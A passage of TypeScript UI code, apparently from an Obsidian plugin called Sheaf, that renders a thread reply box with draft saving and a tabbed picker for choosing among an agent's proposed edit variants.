    input.value = this.replyDrafts.get(thread.id) ?? "";
    input.addEventListener("input", () => {
      if (input.value) this.replyDrafts.set(thread.id, input.value);
      else this.replyDrafts.delete(thread.id);
      autoResize();
    });
    // Size to the restored draft once the element is laid out (scrollHeight is
    // only meaningful after it's in the DOM).
    requestAnimationFrame(autoResize);

    const send = wrap.createEl("button", { text: "Send" });
    send.style.fontSize = "0.8em";

    const submit = async () => {
      const message = input.value.trim();
      if (!message) return;
      input.disabled = true;
      send.disabled = true;
      try {
        await this.plugin.client.replyThread(thread.id, message);
        input.value = "";
        autoResize();
        this.replyDrafts.delete(thread.id);
        await this.refreshCurrent();
      } catch (err) {
        console.error("sheaf: reply failed", err);
        const msg = err instanceof Error ? err.message : String(err);
        new Notice(`Sheaf: ${msg}`, 8000);
      } finally {
        input.disabled = false;
        send.disabled = false;
      }
    };

    send.addEventListener("click", () => void submit());
    input.addEventListener("keydown", (e) => {
      // Enter submits; Shift+Enter inserts a newline for multi-line replies.
      if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        void submit();
      }
    });
  }

  private renderVariants(
    parent: HTMLElement,
    thread: Thread,
    variants: ThreadDraftBody[],
  ): void {
    const selected = Math.min(
      this.selectedVariant.get(thread.id) ?? 0,
      variants.length - 1,
    );

    const wrap = parent.createDiv();
    wrap.style.marginTop = "0.5em";
    wrap.style.padding = "0.4em";
    wrap.style.border = "1px solid var(--background-modifier-border)";
    wrap.style.borderRadius = "4px";
    wrap.style.background = "var(--background-secondary)";

    // Variant tabs (titles in a row, click to switch).
    const tabs = wrap.createDiv();
    tabs.style.display = "flex";
    tabs.style.gap = "0.25em";
    tabs.style.flexWrap = "wrap";
    tabs.style.marginBottom = "0.4em";

    variants.forEach((v, i) => {
      const tab = tabs.createEl("button", {
        text: v.name ?? `option ${i + 1}`,
      });
      tab.style.fontSize = "0.75em";
      tab.style.padding = "0.15em 0.5em";
      tab.style.border = "1px solid var(--background-modifier-border)";
      tab.style.borderRadius = "3px";
      tab.style.cursor = "pointer";
      if (i === selected) {
        tab.style.background = "var(--interactive-accent)";
        tab.style.color = "var(--text-on-accent)";
      } else {
        tab.style.background = "var(--background-primary)";
      }
      tab.addEventListener("click", () => {
        this.selectedVariant.set(thread.id, i);
        this.render();
      });
    });

    // The selected option's trade-off blurb (its "why"), above the sample.
    const description = variants[selected].description;
    if (description) {
      const desc = wrap.createDiv();
      desc.setText(description);
      desc.style.fontSize = "0.85em";
      desc.style.opacity = "0.8";
      desc.style.marginBottom = "0.4em";
    }

    // Preview: a sample of the result for the selected option.
    const preview = wrap.createDiv();
    preview.setText(
      variants[selected].new_md.length > 240
        ? variants[selected].new_md.slice(0, 240) + "…"
        : variants[selected].new_md,
    );
    preview.style.fontSize = "0.85em";
    preview.style.fontFamily = "var(--font-monospace)";
    preview.style.padding = "0.4em";
    preview.style.background = "var(--background-primary)";
    preview.style.borderRadius = "3px";
    preview.style.whiteSpace = "pre-wrap";
    preview.style.maxHeight = "200px";
    preview.style.overflow = "auto";

    // Choose this option. Unlike "apply", this does NOT write the option's
    // text to the doc — it sends the pick back to the agent (like answering
    // an AskUserQuestion), and the agent makes the real edit. The previews
    // may be illustrative samples, not literal replacements.
    const label = variants[selected].name ?? `option ${selected + 1}`;
    const chooseBar = wrap.createDiv();
    chooseBar.style.display = "flex";
    chooseBar.style.gap = "0.5em";
    chooseBar.style.marginTop = "0.4em";
    const choose = chooseBar.createEl("button", { text: `Choose "${label}"` });
    choose.style.fontSize = "0.8em";
    choose.style.background = "var(--interactive-accent)";
    choose.style.color = "var(--text-on-accent)";
    choose.addEventListener("click", async () => {
      try {
        await this.plugin.client.chooseVariant(thread.id, selected + 1, label);
        new Notice(`Sent your pick "${label}" to the agent`);
        this.selectedVariant.delete(thread.id);
        await this.refreshCurrent();
      } catch (err) {
        console.error("sheaf: choose failed", err);
        const msg = err instanceof Error ? err.message : String(err);
        new Notice(`Sheaf: ${msg}`, 8000);
      }
    });
  }
}
